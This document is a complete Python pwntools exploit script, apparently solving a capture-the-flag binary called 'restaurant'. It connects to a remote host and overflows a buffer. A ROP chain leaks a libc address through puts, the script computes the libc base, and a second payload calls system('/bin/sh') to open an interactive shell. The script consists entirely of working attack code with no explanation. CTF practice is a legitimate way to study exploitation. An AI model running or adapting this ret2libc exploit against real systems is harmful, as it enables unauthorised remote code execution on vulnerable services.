#!/usr/bin/env python3

from pwn import *

exe = ELF("./restaurant_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
#p = process()
p = remote('94.237.51.81',50262)

pop_rdi =0x00000000004010a3

offset = 32

payload = b'a'*offset
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(exe.got.puts)
payload += p64(exe.plt.puts)
payload += p64(exe.sym.fill)

p.sendlineafter(b'> ',b'1')

p.sendafter(b'> ',payload)

p.recvuntil(b'your ')
p.recvuntil(b'a'*32)

leak = u64(p.recvline()[:-1].ljust(8,b'\x00'))
log.info(f"leak: {hex(leak)}")
libc.address = leak - 0x80aa0

payload2 = b'b'*offset
payload2 += p64(0) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(pop_rdi+1)
payload2 += p64(libc.sym.system)


p.sendafter(b'> ',payload2)



p.interactive()
